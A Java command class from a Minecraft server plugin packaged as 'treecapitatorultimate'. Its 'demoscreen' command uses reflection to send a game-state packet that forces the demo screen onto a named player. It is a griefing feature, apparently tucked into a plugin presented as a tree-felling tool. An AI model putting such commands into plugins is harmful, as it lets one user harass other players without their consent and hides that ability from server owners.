package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@Command.Info(command = "demoscreen", description = "I hope you bought Minecraft and not pirated it!", category = CommandCategory.Player, requiredArgs = 1)
public class DemoScreen extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            Object packetPlayOutGameStateChange;
            final Class<?> packetPlayOutGameStateChangeClass = ReflectionUtils.getClassCached("{nms}.PacketPlayOutGameStateChange");
            packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(packetPlayOutGameStateChangeClass, int.class, float.class).invoke(5, 0);
            PacketSender.Instance.sendPacket(anotherPlayer, Packet.createFromNMSPacket(packetPlayOutGameStateChange));
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + anotherPlayer.getName() + " now has demo screen!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " showed DemoScreen on "+anotherPlayer.getDisplayName()+"!");
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }
}
